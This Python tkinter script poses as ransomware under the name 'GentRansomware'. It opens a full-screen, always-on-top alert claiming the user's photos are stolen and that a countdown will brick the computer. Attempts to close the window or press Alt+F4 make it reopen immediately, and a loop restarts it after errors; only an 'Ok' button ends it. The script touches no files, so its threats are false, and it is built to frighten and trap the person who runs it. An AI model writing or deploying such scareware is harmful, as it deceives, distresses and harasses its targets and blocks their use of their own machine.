import tkinter as tk
import random
import sys
import os
import subprocess

class GentRansomware:
    def __init__(self):
        self.root = None
        self.running = True
        self.create_window()
        
    def create_window(self):
        self.root = tk.Tk()
        self.root.title("CRITICAL ALERT")
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        self.root.attributes('-topmost', True)
        
        # Catch Alt+F4, Close Button, and any close attempt
        self.root.protocol("WM_DELETE_WINDOW", self.on_close_attempt)
        
        # Also bind Alt+F4 explicitly
        self.root.bind('<Alt-F4>', lambda e: self.on_close_attempt())
        
        self.create_interface()
        self.start_countdown()
        
    def create_interface(self):
        self.title_label = tk.Label(self.root, text="CRITICAL ALERT", 
                                  font=("Arial", 55, "bold"), fg="red", bg="black")
        self.title_label.pack(pady=50)
        
        self.msg_label = tk.Label(self.root, 
            text="YOUR FILES HAVE BEEN COMPROMISED BY GENT\n\nALL OF YOUR PHOTOS ARE NOW MINE.\n\nTIME LEFT: 30 SECONDS BEFORE YOUR COMPUTER IS BRICKED",
            font=("Arial", 28, "bold"), fg="white", bg="black", justify="center")
        self.msg_label.pack(pady=60)
        
        self.ok_button = tk.Button(self.root, text="Ok", font=("Arial", 48, "bold"), 
                                 fg="white", bg="#222222", width=12, height=3,
                                 command=self.cure)
        self.ok_button.pack(pady=80)
        
        self.status_label = tk.Label(self.root, text="", font=("Arial", 20), fg="yellow", bg="black")
        self.status_label.pack(pady=20)

    def start_countdown(self):
        self.time_left = 30
        def countdown():
            if self.time_left > 0 and self.running:
                self.msg_label.config(text=f"YOUR FILES HAVE BEEN COMPROMISED BY GENT\n\nALL OF YOUR PHOTOS ARE NOW MINE.\n\nTIME LEFT: {self.time_left} SECONDS BEFORE YOUR COMPUTER IS BRICKED")
                self.time_left -= 1
                self.root.after(1000, countdown)
            elif self.running:
                self.status_label.config(text="BRICKING IN PROGRESS...", fg="red")
        countdown()

    def on_close_attempt(self):
        """This runs when someone tries Alt+F4 or clicks the X"""
        if self.root:
            self.root.destroy()
        # Re-open immediately
        self.create_window()

    def cure(self):
        self.running = False
        
        # Clear everything
        for widget in self.root.winfo_children():
            widget.destroy()
        
        # Final screen - ONLY "Okay"
        okay_label = tk.Label(self.root, text="Okay", 
                            font=("Arial", 130, "bold"), fg="#00ff00", bg="black")
        okay_label.pack(expand=True)
        
        # Auto close after 4 seconds
        self.root.after(4000, self.force_quit)

    def force_quit(self):
        self.running = False
        if self.root:
            self.root.destroy()
        sys.exit(0)

# ==================== LAUNCH THE EVIL ====================
if __name__ == "__main__":
    # Optional: Make it harder to kill by running in a loop
    while True:
        try:
            app = GentRansomware()
            app.root.mainloop()
            break  # Only break if closed properly
        except:
            continue